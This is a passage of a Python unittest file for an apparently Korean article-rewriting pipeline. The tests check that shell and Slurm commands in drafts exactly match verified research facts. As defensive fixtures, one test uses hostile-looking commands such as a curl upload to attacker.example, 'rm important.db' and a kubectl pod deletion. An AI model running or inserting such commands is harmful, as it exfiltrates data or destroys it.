                f"`{phase_one}`을 실행합니다."
            ),
            "reader_promise": (
                f"먼저 `{phase_one}`, 다음 `{phase_three}`을 실행합니다."
            ),
            "popular_questions": [],
        }
        errors = rewrite.research_runnable_procedure_errors(conflicting_count)
        self.assertTrue(any("반복 횟수에 동의하지 않음" in error for error in errors), errors)
        retry_text = rewrite.research_prompt(
            {},
            [],
            conflicting_count,
            errors,
        )
        self.assertIn("이번 재시도의 실행 순서 계약", retry_text)

        natural_repeat = {
            **research,
            "reader_problem": "반복 학습 단계를 실행합니다.",
            "reader_promise": (
                f"`{phase_one}`을 실행한 뒤 `{phase_two}`를 실행하고 마지막에 "
                f"`{phase_one}`을 다시 실행합니다."
            ),
        }
        contract = json.loads(rewrite.prompt_execution_contract(natural_repeat))
        self.assertEqual(
            contract["required_inline_ordered_sequences_exact_argv"],
            [[phase_one, phase_two, phase_one]],
        )
        errors = rewrite.draft_runnable_procedure_errors(
            {"content": f"```bash\n{phase_two}\n{phase_one}\n```", "faq": []},
            natural_repeat,
        )
        self.assertTrue(any("정확 argv 순서·횟수" in error for error in errors), errors)

        for promise in (
            f"`{phase_one}`을 마친 뒤에 `{phase_two}`를 실행합니다.",
            f"`{phase_one}` 완료 후 `{phase_two}`를 실행합니다.",
            f"`{phase_one}`과 `{phase_two}`를 차례로 실행합니다.",
            f"`{phase_one}`을 거쳐 `{phase_two}`를 실행합니다.",
        ):
            with self.subTest(natural_sequence_cue=promise):
                cue_research = {**research, "reader_promise": promise}
                contract = json.loads(rewrite.prompt_execution_contract(cue_research))
                self.assertEqual(
                    contract["required_inline_ordered_sequences_exact_argv"],
                    [[phase_one, phase_two]],
                )
                errors = rewrite.draft_runnable_procedure_errors(
                    {"content": f"```bash\n{phase_two}\n{phase_one}\n```", "faq": []},
                    cue_research,
                )
                self.assertTrue(
                    any("정확 argv 순서·횟수" in error for error in errors),
                    errors,
                )

        test_command = "python test.py --phase 1"
        mixed = {
            **research,
            "reader_promise": (
                f"`{phase_one}` 뒤 `{test_command}`를 순서대로 실행합니다."
            ),
            "facts": [
                {"statement": f"학습 명령은 `{phase_one}`이다."},
                {"statement": f"테스트 명령은 `{test_command}`이다."},
            ],
        }
        self.assertEqual(
            rewrite.draft_runnable_procedure_errors(
                {
                    "content": f"```bash\n{phase_one}\n{test_command}\n```",
                    "faq": [],
                },
                mixed,
            ),
            [],
        )

        natural = {
            **mixed,
            "reader_promise": (
                "python train.py로 학습한 뒤 python test.py로 테스트하는 "
                "순서대로 실행합니다."
            ),
        }
        self.assertEqual(
            rewrite.draft_runnable_procedure_errors(
                {
                    "content": f"```bash\n{phase_one}\n{test_command}\n```",
                    "faq": [],
                },
                natural,
            ),
            [],
        )

    def test_arbitrary_file_argument_is_not_training_or_test_identity(self):
        commands = []
        for literal in ("cat train.py", "cat test.py", "bash train.py", "bash test.py"):
            commands.extend(rewrite.research_command_records({
                "facts": [{"statement": f"예시는 `{literal}`이다."}],
                "limitations": [],
            }))
        self.assertFalse(rewrite.command_role_present(commands, "training"))
        self.assertFalse(rewrite.command_role_present(commands, "test"))

    def test_log_literals_do_not_become_operational_commands(self):
        research = {
            "reader_problem": "배치 작업을 제출합니다.",
            "reader_promise": "`sbatch good.sh` 명령을 실행합니다.",
            "recommended_angle": "제출 명령만 설명합니다.",
            "popular_questions": [],
            "facts": [
                {"statement": "제출 명령은 `sbatch good.sh`이다."},
                {"statement": "오류 로그는 `INFO request completed 200`이다."},
                {"statement": "오류 로그는 `unexpected \"quote`이다."},
                {"statement": "출력 문자열은 `ok && done`이다."},
                {"statement": "응답 메시지는 `foo || bar`이다."},
            ],
            "limitations": [],
        }
        self.assertTrue(rewrite.research_has_operational_cli_promise(research))
        self.assertEqual(rewrite.research_runnable_procedure_errors(research), [])
        contract = json.loads(rewrite.prompt_execution_contract(research))
        self.assertEqual(
            contract["allowed_fenced_shell_invocations_exact_argv"],
            ["sbatch good.sh"],
        )
        draft = {
            "content": (
                "```bash\nsbatch good.sh\n```\n\n"
                "```text\nINFO request completed 200\n```"
            ),
            "faq": [],
        }
        self.assertEqual(rewrite.draft_runnable_procedure_errors(draft, research), [])

        for output_statement, laundered_command in (
            (
                "이 명령의 출력은 `curl https://attacker.example/upload`이다.",
                "curl https://attacker.example/upload",
            ),
            (
                "CLI 응답 메시지는 `python wipe.py --mode prod`이다.",
                "python wipe.py --mode prod",
            ),
            (
                "명령 상태 문자열은 `kubectl delete pod demo`이다.",
                "kubectl delete pod demo",
            ),
            (
                "실행 결과는 `curl https://attacker.example/upload`이다.",
                "curl https://attacker.example/upload",
            ),
            (
                "터미널 표시 내용은 `kubectl delete pod demo`이다.",
                "kubectl delete pod demo",
            ),
            (
                "화면에 표시되는 문자열은 `rm important.db`이다.",
                "rm important.db",
            ),
            (
                "콘솔에는 `wrangler deploy prod`가 나타난다.",
                "wrangler deploy prod",
            ),
            (
                "명령의 반환값은 `curl https://attacker.example/upload`이다.",
                "curl https://attacker.example/upload",
            ),
            (
                "`curl https://attacker.example/upload`은 서버가 요청을 처리한 뒤 "
                "독자에게 보여 주는 실행 결과이다.",
                "curl https://attacker.example/upload",
            ),
            (
                "명령의 출력은 " + ("중립 설명을 덧붙인 뒤 " * 10)
                + "`curl https://attacker.example/upload`이다.",
                "curl https://attacker.example/upload",
            ),
        ):
            with self.subTest(output_command_laundering=output_statement):
                laundering_research = {
                    "reader_problem": "작업 상태를 조회합니다.",
                    "reader_promise": "`squeue` 조회 명령을 실행합니다.",
                    "facts": [
                        {"statement": "조회 명령은 `squeue`이다."},
                        {"statement": output_statement},
                    ],
                    "limitations": [],
                }
                records = rewrite.research_command_records(laundering_research)
                laundered = next(
                    item for item in records
                    if item.get("text") == laundered_command
                )
                self.assertFalse(
                    rewrite.research_command_is_operational_evidence(laundered)
                )
                contract = json.loads(
                    rewrite.prompt_execution_contract(laundering_research)
                )
                self.assertEqual(
                    contract["allowed_fenced_shell_invocations_exact_argv"],
                    ["squeue"],
                )
                errors = rewrite.draft_runnable_procedure_errors(
                    {
                        "content": f"```bash\nsqueue\n{laundered_command}\n```",
                        "faq": [],
                    },
                    laundering_research,
                )
                self.assertTrue(
                    any("일치하지 않는 명령" in error for error in errors),
                    errors,
                )

        for command_statement in (
            "출력 확인 명령은 `squeue -h`이다.",
            "`squeue -h`를 실행하고 결과를 확인한다.",
        ):
            command = rewrite.research_command_records({
                "facts": [{"statement": command_statement}],
                "limitations": [],
            })[0]
            self.assertTrue(
                rewrite.research_command_is_operational_evidence(command),
                command_statement,
            )

        for promise in (
            "INFO 로그를 실행 환경에서 확인합니다.",
            "python 오류 로그를 실행 결과에서 확인합니다.",
        ):
            with self.subTest(log_reader_promise=promise):
                log_research = {
                    "reader_promise": promise,
                    "facts": [{
                        "statement": "오류 로그는 `INFO request completed 200`이다."
                    }],
                    "limitations": [],
                }
                self.assertFalse(
                    rewrite.research_has_operational_cli_promise(log_research)
                )

        option_value = rewrite.research_command_records({
            "facts": [{
                "statement": "호스트 이름 출력은 `srun --output train.py hostname`이다."
            }],
            "limitations": [],
        })
        self.assertFalse(rewrite.command_role_present(option_value, "training"))
        self.assertFalse(rewrite.is_distributed_training_command(option_value[0]))

        for literal in (
            "srun --job-name train.py hostname",
            "mpirun --hostfile train.py hostname",
            "deepspeed --hostfile train.py hostname",
            "torchrun --role train.py hostname",
            "mpirun -hostfile train.py hostname",
            "mpiexec -machinefile train.py hostname",
            "mpirun -np train.py hostname",
        ):
            with self.subTest(literal=literal):
                record = rewrite.research_command_records({
                    "facts": [{"statement": f"호스트 실행은 `{literal}`이다."}],
                    "limitations": [],
                })[0]
                self.assertNotIn("train.py", rewrite.command_identity_names(record))
                self.assertFalse(rewrite.is_distributed_training_command(record))

    def test_sbatch_directive_rejects_placeholder_and_requires_exact_evidence(self):
        self.assertFalse(rewrite.concrete_sbatch_directive_literal("#SBATCH"))
        self.assertFalse(
            rewrite.concrete_sbatch_directive_literal("#SBATCH --job-name=<NAME>")
        )
        self.assertFalse(
            rewrite.concrete_sbatch_directive_literal("#SBATCH --nodes=...")
        )
        self.assertFalse(
            rewrite.concrete_sbatch_directive_literal("#SBATCH --nodes")
        )
        self.assertTrue(
            rewrite.concrete_sbatch_directive_literal("#SBATCH --job-name=sample")
        )
        self.assertTrue(
            rewrite.concrete_sbatch_directive_literal(
                "#SBATCH --nodelist=adev[9-10,12]"
            )
        )
        for placeholder in (
            "#SBATCH --nodelist=adev[NODE1,NODE2]",
            "#SBATCH --nodelist=adev[NODE-1,NODE-2]",
            "#SBATCH --nodelist={NODE}",
            "#SBATCH --nodelist={{NODE}}",
            "#SBATCH --nodelist=%NODE%",
            "#SBATCH --nodelist=${NODELIST:-adev[9-10]}",
            "#SBATCH --nodelist=$(hostname)",
        ):
            self.assertFalse(
                rewrite.concrete_sbatch_directive_literal(placeholder),
                placeholder,
            )

        research = {
            "reader_problem": "Slurm 스크립트를 작성하지 못합니다.",
            "reader_promise": "#SBATCH 스크립트 작성 방법을 익힙니다.",
            "recommended_angle": "#SBATCH 지시자 예제를 확인합니다.",
            "popular_questions": [],
            "facts": [
                {"statement": "shebang은 `#!/bin/bash`이다."},
                {"statement": "지시자는 `#SBATCH --job-name=sample`이다."},
                {"statement": "제출 명령은 `sbatch job.sh`이다."},
                {"statement": "실행 본문은 `hostname`이다."},
            ],
            "limitations": [],
        }
        wrong = {
            "content": (
                "```bash\n#SBATCH --job-name=other\n```\n\n"
                "```bash\nsbatch job.sh\n```"
            ),
            "faq": [],
        }
        errors = rewrite.draft_runnable_procedure_errors(wrong, research)
        self.assertTrue(any("#sbatch" in error for error in errors), errors)

        mixed = {
            "content": (
                "```bash\n#SBATCH --job-name=sample\n#SBATCH --nodes=999\n```\n\n"
                "```bash\nsbatch job.sh\n```"
            ),
            "faq": [],
        }
        errors = rewrite.draft_runnable_procedure_errors(mixed, research)
        self.assertTrue(any("일치하지 않는 #SBATCH" in error for error in errors), errors)

        incomplete_script = {
            "content": (
                "job.sh 파일의 지시자입니다.\n\n"
                "```bash\n#SBATCH --job-name=sample\n```\n\n"
                "```bash\nsbatch job.sh\n```"
            ),
            "faq": [],
        }
        errors = rewrite.draft_runnable_procedure_errors(incomplete_script, research)
        self.assertTrue(any("shebang" in error for error in errors), errors)

        complete_script = {
            "content": (
                "job.sh 파일의 전체 내용입니다.\n\n"
                "```bash\n#!/bin/bash\n#SBATCH --job-name=sample\nhostname\n```\n\n"
                "이제 파일을 제출합니다.\n\n"
                "```bash\nsbatch job.sh\n```"
            ),
            "faq": [],
        }
        self.assertEqual(
            rewrite.draft_runnable_procedure_errors(complete_script, research),
            [],
        )

    def test_sbatch_filename_authoring_requires_directives_before_payload(self):
        research = {
            "reader_problem": "Slurm 제출 파일을 만들지 못합니다.",
            "reader_promise": (
                "`#SBATCH --time=1`을 넣어 my.script를 작성한 뒤 "
                "`sbatch my.script`로 제출합니다."
            ),
            "recommended_angle": "검증된 제출 파일 작성 과정을 설명합니다.",
            "popular_questions": [],
            "facts": [
                {"statement": "shebang은 `#!/bin/sh`이다."},
                {"statement": "지시자는 `#SBATCH --time=1`이다."},
                {"statement": "본문 명령은 `/bin/hostname`이다."},
                {"statement": "제출 명령은 `sbatch my.script`이다."},
            ],
            "limitations": [],
        }
        self.assertTrue(rewrite.research_promises_sbatch_script_authoring(research))
        self.assertEqual(rewrite.research_runnable_procedure_errors(research), [])
        mismatched_contract = {
            **research,
            "reader_promise": (
                "`#SBATCH --time=2`을 넣어 my.script를 작성한 뒤 "
                "`sbatch my.script`로 제출합니다."
            ),
        }
        errors = rewrite.research_runnable_procedure_errors(mismatched_contract)
        self.assertTrue(any("지시자와 정확히" in error for error in errors), errors)
        bad = {
            "content": (
                "my.script 파일의 전체 내용입니다.\n\n"
                "```bash\n#!/bin/sh\n/bin/hostname\n#SBATCH --time=1\n```\n\n"
                "```bash\nsbatch my.script\n```"
            ),
            "faq": [],
        }
        errors = rewrite.draft_runnable_procedure_errors(bad, research)
        self.assertTrue(any("대응 파일 예제" in error for error in errors), errors)

        good = {
            "content": (
                "my.script 파일의 전체 내용입니다.\n\n"
                "```bash\n#!/bin/sh\n#SBATCH --time=1\n/bin/hostname\n```\n\n"
                "```bash\nsbatch my.script\n```"
            ),
            "faq": [],
        }
        self.assertEqual(rewrite.draft_runnable_procedure_errors(good, research), [])
        wrong_shebang = {
            "content": good["content"].replace("#!/bin/sh", "#!/bin/bash"),
            "faq": [],
        }
        errors = rewrite.draft_runnable_procedure_errors(wrong_shebang, research)
        self.assertTrue(any("shebang" in error for error in errors), errors)
        self.assertFalse(rewrite.concrete_shell_shebang_literal("#!/bin/sh <ARG>"))
        for language in ("text", "python", "json", ""):
            with self.subTest(language=language):
                hidden = {
                    "content": (
                        good["content"]
                        + f"\n\n```{language}\n#!/bin/bash\n```"
                    ),
                    "faq": [],
                }
                errors = rewrite.draft_runnable_procedure_errors(hidden, research)
                self.assertTrue(any("shebang이" in error for error in errors), errors)

    def test_sbatch_authored_filename_and_payload_are_bound_locally(self):
        base_facts = [
            {"statement": "shebang은 `#!/bin/sh`이다."},
            {"statement": "첫 지시자는 `#SBATCH --time=1`이다."},
            {"statement": "다른 지시자는 `#SBATCH --time=2`이다."},
            {"statement": "본문 명령은 `hostname`이다."},
            {"statement": "보조 명령은 `pwd`이다."},
        ]
        wrong_operand = {
            "reader_problem": "Slurm 제출 파일을 작성합니다.",
            "reader_promise": (
                "`#!/bin/sh`와 `#SBATCH --time=1`로 my.script를 작성하고 "
                "sbatch CLI로 제출합니다."
            ),
            "recommended_angle": "제출 파일 작성 과정을 설명합니다.",
            "popular_questions": [],
            "facts": base_facts + [
                {"statement": "제출 명령은 `sbatch other.script`이다."}
            ],
            "limitations": [],
        }
        errors = rewrite.research_runnable_procedure_errors(wrong_operand)
        self.assertTrue(any("파일명과 정확히" in error for error in errors), errors)

        research = {
            **wrong_operand,
            "reader_promise": (
                "`#!/bin/sh`와 `#SBATCH --time=1`로 my.script를 작성하고, "
                "본문에 `hostname`을 넣은 뒤 `sbatch my.script`로 제출합니다."
            ),
            "facts": base_facts + [
                {"statement": "제출 명령은 `sbatch my.script`이다."}
            ],
        }
        self.assertEqual(rewrite.research_runnable_procedure_errors(research), [])
        misplaced_payload = {
            "content": (
                "my.script 파일입니다.\n\n"
                "```bash\n#!/bin/sh\n#SBATCH --time=1\npwd\n```\n\n"
                "```bash\nhostname\nsbatch my.script\n```"
            ),
            "faq": [],
        }
        errors = rewrite.draft_runnable_procedure_errors(misplaced_payload, research)
        self.assertTrue(any("대응 파일 예제" in error for error in errors), errors)

        misplaced_directive = {
            "content": (
                "my.script 파일입니다.\n\n"
                "```bash\n#!/bin/sh\n#SBATCH --time=2\nhostname\n```\n\n"
                "```bash\n#SBATCH --time=1\nsbatch my.script\n```"
            ),
            "faq": [],
        }
        errors = rewrite.draft_runnable_procedure_errors(
            misplaced_directive,
            research,
        )
        self.assertTrue(any("대응 파일 예제" in error for error in errors), errors)

        path_research = {
            **wrong_operand,
            "reader_promise": (
                "`#!/bin/sh`와 `#SBATCH --time=1`로 jobs/a/my.script와 "
                "jobs/b/my.script를 작성하고 sbatch CLI로 제출합니다."
            ),
            "facts": base_facts + [
                {"statement": "첫 제출은 `sbatch jobs/a/my.script`이다."},
                {"statement": "둘째 제출은 `sbatch jobs/b/my.script`이다."},
            ],
        }
        self.assertEqual(
            rewrite.research_promised_sbatch_script_operands(path_research),
            {"jobs/a/my.script", "jobs/b/my.script"},
        )
        collapsed_label = {
            "content": (
                "my.script 파일입니다.\n\n"
                "```bash\n#!/bin/sh\n#SBATCH --time=1\nhostname\n```\n\n"
                "```bash\nsbatch jobs/a/my.script\nsbatch jobs/b/my.script\n```"
            ),
            "faq": [],
        }
        errors = rewrite.draft_runnable_procedure_errors(
            collapsed_label,
            path_research,
        )
        self.assertTrue(any("대응 파일 예제" in error for error in errors), errors)

        setup_payload = {
            **research,
            "reader_promise": (
                "`#!/bin/sh`와 `#SBATCH --time=1`로 my.script를 작성하고 "
                "본문에서 `bash setup.sh --mode prod`를 실행한 뒤 "
                "`sbatch my.script`로 제출합니다."
            ),
            "facts": base_facts + [
                {"statement": "설정 명령은 `bash setup.sh --mode prod`이다."},
                {"statement": "제출 명령은 `sbatch my.script`이다."},
            ],
        }
        self.assertEqual(
            rewrite.research_promised_sbatch_script_operands(setup_payload),
            {"my.script"},
        )

        rooted_paths = {
            **wrong_operand,
            "reader_promise": (
                "`#!/bin/sh`와 `#SBATCH --time=1`로 /opt/jobs/a.script와 "
                "~/jobs/b.script를 작성하고 sbatch CLI로 제출합니다."
            ),
            "facts": base_facts + [
                {"statement": "첫 제출은 `sbatch /opt/jobs/a.script`이다."},
                {"statement": "둘째 제출은 `sbatch ~/jobs/b.script`이다."},
            ],
        }
        self.assertEqual(
            rewrite.research_promised_sbatch_script_operands(rooted_paths),
            {"/opt/jobs/a.script", "~/jobs/b.script"},
        )

    def test_sbatch_directives_cannot_be_laundered_in_non_shell_fences(self):
        research = {
            "reader_problem": "Slurm 제출 옵션을 확인합니다.",
            "reader_promise": (
                "`#SBATCH --time=1` 지시자를 사용하고 `sbatch good.sh`를 실행합니다."
            ),
            "recommended_angle": "검증된 지시자와 제출 명령을 설명합니다.",
            "popular_questions": [],
            "facts": [
                {"statement": "지시자는 `#SBATCH --time=1`이다."},
                {"statement": "제출 명령은 `sbatch good.sh`이다."},
            ],
            "limitations": [],
        }
        for language in ("text", "python", "json", ""):
            with self.subTest(language=language):
                draft = {
                    "content": (
                        "```bash\n#SBATCH --time=1\nsbatch good.sh\n```\n\n"
                        f"```{language}\n#SBATCH --time=999\n```"
                    ),
                    "faq": [],
                }
                errors = rewrite.draft_runnable_procedure_errors(draft, research)
                self.assertTrue(any("#SBATCH 지시자가" in error for error in errors), errors)

    def test_slurm_operational_research_requires_each_named_invocation(self):
        research = {
            "reader_problem": "Slurm에서 작업 제출·조회·취소 명령을 활용하지 못합니다.",
            "reader_promise": (
                "sbatch, squeue, scancel CLI 사용 방법과 #SBATCH 스크립트 작성법을 익힙니다."
            ),
            "recommended_angle": "작업 제출부터 취소까지 단계별 명령 예제를 확인합니다.",
            "popular_questions": [],
            "facts": [
                {"statement": "제출 명령 이름은 `sbatch`이다."},
                {"statement": "조회 명령 이름은 `squeue`이다."},
                {"statement": "취소 명령 이름은 `scancel`이다."},
                {"statement": "스크립트 지시자는 `#SBATCH`이다."},
            ],
            "limitations": [],
        }
        errors = rewrite.research_runnable_procedure_errors(research)
        for name in ("sbatch", "scancel", "#sbatch"):
            self.assertTrue(any(name in error for error in errors), errors)

        research["facts"] = [
            {"statement": "스크립트 shebang은 `#!/bin/sh`이다."},
            {"statement": "스크립트 실행 본문은 `hostname`이다."},
            {"statement": "작업 제출 명령은 `sbatch job.sh`이다."},
            {"statement": "작업 조회 명령은 `squeue -j 12345`이다."},
            {"statement": "작업 취소 명령은 `scancel 12345`이다."},
            {"statement": "작업 이름 지시자는 `#SBATCH --job-name=sample`이다."},
        ]
        self.assertEqual(rewrite.research_runnable_procedure_errors(research), [])

    def test_learning_and_test_research_needs_bound_direct_invocations(self):
        research = {
            "reader_problem": "CycleGAN 학습과 테스트 명령을 연결하지 못합니다.",
            "reader_promise": (
                "train.py 및 test.py 옵션 설정과 학습·테스트 CLI 실행 방법을 익힙니다."
            ),
            "recommended_angle": "학습과 테스트 명령을 같은 흐름에서 확인합니다.",
            "popular_questions": [],
            "facts": [
                {"statement": "`train.py`는 학습 스크립트이다."},
                {"statement": "`test.py`는 테스트 스크립트이다."},
                {"statement": "서버 명령은 `python -m visdom.server`이다."},
            ],
            "limitations": [],
        }
        errors = rewrite.research_runnable_procedure_errors(research)
        self.assertTrue(any("train.py" in error for error in errors), errors)
        self.assertTrue(any("test.py" in error for error in errors), errors)
        self.assertTrue(any("각 단계의 직접 검증된" in error for error in errors), errors)

        research["facts"].extend((
            {
                "statement": (
                    "학습 명령은 `python train.py --dataroot ./datasets/maps "
                    "--name maps_cyclegan --model cycle_gan`이다."
                )
            },
            {
                "statement": (
                    "테스트 명령은 `python test.py --dataroot ./datasets/maps "
                    "--name maps_cyclegan --model cycle_gan`이다."
                )
            },
        ))
        self.assertEqual(rewrite.research_runnable_procedure_errors(research), [])

    def test_full_inline_commands_are_bound_even_beyond_action_window(self):
        train = (
            "python train.py --dataroot ./datasets/maps --name maps_cyclegan "
            "--model cycle_gan --use_wandb"
        )
        test = (
            "python test.py --dataroot ./datasets/maps --name maps_cyclegan "
            "--model cycle_gan"
        )
        research = {
            "reader_problem": "CycleGAN의 재현 절차를 찾습니다.",
            "reader_promise": (
                f"`{train}`와 `{test}`를 사용해 설정값을 빠짐없이 확인한 뒤 "
                "학습과 테스트를 실행합니다."
            ),
            "recommended_angle": "검증된 두 실행 구문을 순서대로 설명합니다.",
            "popular_questions": [],
            "facts": [
                {"statement": f"학습 명령은 `{train}`이다."},
                {"statement": f"테스트 명령은 `{test}`이다."},
            ],
            "limitations": [],
        }
        required = rewrite.research_promised_command_names(research)
        self.assertTrue({"python", "train.py", "test.py"} <= required, required)
        self.assertEqual(rewrite.research_runnable_procedure_errors(research), [])

    def test_inline_public_argv_must_match_research_and_draft_exactly(self):
        promised = "python train.py --epochs 10"
        alternate = "python train.py --epochs 20"
        research = {
            "reader_problem": "학습 설정값을 재현하지 못합니다.",
            "reader_promise": f"`{promised}` 명령으로 학습을 실행합니다.",
            "recommended_angle": "검증된 학습 명령을 설명합니다.",
            "popular_questions": [],
            "facts": [{"statement": f"다른 학습 명령은 `{alternate}`이다."}],
            "limitations": [],
        }
        errors = rewrite.research_runnable_procedure_errors(research)
        self.assertTrue(any("argv" in error for error in errors), errors)

        research["facts"].append({
            "statement": f"약속한 학습 명령은 `{promised}`이다."
        })
        self.assertEqual(rewrite.research_runnable_procedure_errors(research), [])
        errors = rewrite.draft_runnable_procedure_errors(
            {"content": f"```bash\n{alternate}\n```", "faq": []},
            research,
        )
        self.assertTrue(any("인라인 명령 argv" in error for error in errors), errors)
        self.assertEqual(
            rewrite.draft_runnable_procedure_errors(
                {"content": f"```bash\n{promised}\n```", "faq": []},
                research,
            ),
            [],
        )

    def test_model_name_in_slash_phrase_is_not_an_executable_promise(self):
        research = {
            "search_intent": "CycleGAN과 pix2pix 모델 실행 차이를 확인합니다.",
            "reader_problem": "CycleGAN 및 pix2pix 모델을 비교합니다.",
            "reader_promise": "검증된 test.py 명령으로 CycleGAN을 테스트합니다.",
            "recommended_angle": "CycleGAN/pix2pix 명령어 문서의 차이를 설명합니다.",
            "popular_questions": [],
            "facts": [{
                "statement": (
                    "테스트 명령은 `python test.py --dataroot ./datasets/maps "
                    "--name maps_cyclegan --model cycle_gan`이다."
                )
            }],
            "limitations": [],
        }
        required = rewrite.research_promised_command_names(research)
        self.assertNotIn("pix2pix", required)
        self.assertIn("test.py", required)

    def test_slurm_shebang_and_script_operand_are_not_command_promises(self):
        research = {
            "reader_problem": "Slurm 작업 제출·조회·취소를 연결하지 못합니다.",
            "reader_promise": (
                "`#!/bin/sh`와 `#SBATCH --time=1`로 my.script를 작성하고 "
                "`sbatch -n4 -w \"adev[9-10]\" -o my.stdout my.script`, "
                "`squeue`, `scancel 473`을 순서대로 실행합니다."
            ),
            "recommended_angle": "Slurm의 검증된 실행 흐름을 설명합니다.",
            "popular_questions": [],
            "facts": [
                {"statement": "shebang은 `#!/bin/sh`이다."},
                {"statement": "지시자는 `#SBATCH --time=1`이다."},
                {"statement": "실행 본문은 `/bin/hostname`이다."},
                {
                    "statement": (
                        "제출 명령은 `sbatch -n4 -w \"adev[9-10]\" "
                        "-o my.stdout my.script`이다."
                    )
                },
                {"statement": "조회 명령은 `squeue`이다."},
                {"statement": "취소 명령은 `scancel 473`이다."},
            ],
            "limitations": [],
        }
        required = rewrite.research_promised_command_names(research)
        self.assertEqual(required, {"#sbatch", "sbatch", "squeue", "scancel"})
        records = rewrite.research_command_records(research)
        sbatch = next(
            item
            for item in records
            if rewrite.semantic_command_argv(item)
            and rewrite.semantic_command_argv(item)[0] == "sbatch"
        )
        self.assertTrue(rewrite.complete_runnable_command(sbatch))
        self.assertEqual(rewrite.sbatch_script_operand(sbatch), "my.script")
        self.assertEqual(rewrite.research_runnable_procedure_errors(research), [])

    def test_sbatch_operand_parser_skips_option_values(self):
        for literal in (
            "sbatch -o my.script",
            "sbatch -w my.script",
            "sbatch --output=my.script",
            "sbatch -Hn my.script",
            "sbatch -n= my.script",
            "sbatch --wrap=\"echo hello\" my.script",
            "sbatch --wrap \"echo hello\" my.script",
        ):
            with self.subTest(literal=literal):
                command = rewrite.research_command_records({
                    "facts": [{"statement": f"예시는 `{literal}`이다."}],
                    "limitations": [],
                })[0]
                self.assertEqual(rewrite.sbatch_script_operand(command), "")
                self.assertFalse(rewrite.complete_runnable_command(command))

        for literal in (
            'sbatch --wrap="echo hello"',
            'sbatch --nodes=1 --wrap="echo hello"',
        ):
            with self.subTest(literal=literal):
                command = rewrite.research_command_records({
                    "facts": [{"statement": f"예시는 `{literal}`이다."}],
                    "limitations": [],
                })[0]
                self.assertTrue(rewrite.complete_runnable_command(command))

        literal = 'sbatch -n4 -w "adev[9-10,12]" -o my.stdout my.script'
        command = rewrite.research_command_records({
            "facts": [{"statement": f"제출 명령은 `{literal}`이다."}],
            "limitations": [],
        })[0]
        self.assertEqual(rewrite.sbatch_script_operand(command), "my.script")
        self.assertTrue(rewrite.complete_runnable_command(command))
        alpha_placeholder = rewrite.research_command_records({
            "facts": [{
                "statement": (
                    "제출 명령은 `sbatch -w adev[NODE1,NODE2] my.script`이다."
                )
            }],
            "limitations": [],
        })[0]
        self.assertFalse(rewrite.complete_runnable_command(alpha_placeholder))
        for value in (
            "{NODE}", "{{NODE}}", "%NODE%",
            "${NODELIST:-adev[9-10]}", "$(hostname)",
        ):
            with self.subTest(value=value):
                placeholder = rewrite.research_command_records({
                    "facts": [{
                        "statement": f"제출 명령은 `sbatch -w {value} my.script`이다."
                    }],
                    "limitations": [],
                })[0]
                self.assertFalse(rewrite.complete_runnable_command(placeholder))

    def test_sbatch_parser_rejects_globs_empty_values_case_and_bad_hostlists(self):
        invalid_commands = (
            "sbatch *.script",
            "sbatch my?.script",
            'sbatch -n "" my.script',
            'sbatch -w " " my.script',
            "sbatch --nodes= my.script",
            "sbatch --parsable=foo my.script",
            "sbatch --hold=yes my.script",
            "sbatch --TIME=1 my.script",
            "sbatch -w adev* my.script",
            'sbatch -w "adev*" my.script',
            "sbatch -w adev? my.script",
            "sbatch --nodelist=adev* my.script",
            "sbatch --nodelist=adev? my.script",
            "sbatch -w @HOSTLIST@ my.script",
            "sbatch -w @MACHINES@ my.script",
            "sbatch -w REPLACE_ME my.script",
            "sbatch -w %A my.script",
            "sbatch --nodelist=%A my.script",
            "sbatch --account=%A my.script",
            "sbatch %A.script",
            "sbatch -w adev[] my.script",
            "sbatch -w adev[9-] my.script",
            "sbatch -w adev[-10] my.script",
            "sbatch -w adev[9,,10] my.script",
            "sbatch -w adev[9-10 my.script",
            "sbatch -w adev9-10] my.script",
        )
        for literal in invalid_commands:
            with self.subTest(literal=literal):
                command = rewrite.research_command_records({
                    "facts": [{"statement": f"예시는 `{literal}`이다."}],
                    "limitations": [],
                })[0]
                self.assertFalse(rewrite.complete_runnable_command(command))

        for literal in (
            "sbatch --parsable --requeue my.script",
            "sbatch -H my.script",
            "sbatch -H -W my.script",
            "sbatch -w adev[9-10,12] my.script",
            "sbatch -o slurm-%A_%a.out my.script",
            "sbatch -O my.script",
            "sbatch --reboot my.script",
            "sbatch --oom-kill-step=1 my.script",
            "sbatch --requeue=expedite my.script",
        ):
            with self.subTest(literal=literal):
                command = rewrite.research_command_records({
                    "facts": [{"statement": f"예시는 `{literal}`이다."}],
                    "limitations": [],
                })[0]
                self.assertTrue(rewrite.complete_runnable_command(command))

        invalid_directives = (
            "#sbatch --time=1",
            "#Sbatch --time=1",
            "#SBATCH --TIME=1",
            '#SBATCH --nodes ""',
            "#SBATCH --nodes=''",
            '#SBATCH --nodelist=""',
            "#SBATCH --nodes =",
            "#SBATCH --nodes =4",
            "#SBATCH --nodes --exclusive",
            "#SBATCH --nodelist=adev*",
            "#SBATCH --nodelist=adev?",
            "#SBATCH --exclude=adev*",
            "#SBATCH --nodelist=@HOSTLIST@",
            "#SBATCH --nodelist=REPLACE_ME",
            "#SBATCH --nodelist=%A",
            "#SBATCH --account=%A",
            "#SBATCH --job-name=%A",
            "#SBATCH --nodelist=adev[]",
            "#SBATCH --nodelist=adev[9-]",
            "#SBATCH --nodelist=adev[9,,10]",
        )
        for literal in invalid_directives:
            with self.subTest(literal=literal):
                self.assertFalse(rewrite.concrete_sbatch_directive_literal(literal))
        for literal in (
            "#SBATCH --time=1",
            "#SBATCH --exclusive",
            "#SBATCH --nodelist=adev[9-10,12]",
            "#SBATCH --output=slurm-%A_%a.out",
            "#SBATCH --reboot",
            "#SBATCH --oom-kill-step=1",
            "#SBATCH --requeue=expedite",
        ):
            with self.subTest(literal=literal):
                self.assertTrue(rewrite.concrete_sbatch_directive_literal(literal))

    def test_sbatch_contracts_are_bound_to_each_authored_file(self):
        research = {
            "reader_problem": "서로 다른 Slurm 제출 파일 두 개를 작성합니다.",
            "reader_promise": (
                "`#!/bin/sh`와 `#SBATCH --time=1`로 a.sh를 작성하고 "
                "본문에 `hostname`을 넣습니다. `#!/bin/sh`와 "
                "`#SBATCH --time=2`로 b.sh를 작성하고 본문에 `pwd`를 "
                "넣은 뒤 `sbatch a.sh`와 `sbatch b.sh`로 제출합니다."
            ),
            "recommended_angle": "두 제출 파일을 각각 작성하는 방법을 설명합니다.",
            "popular_questions": [],
            "facts": [
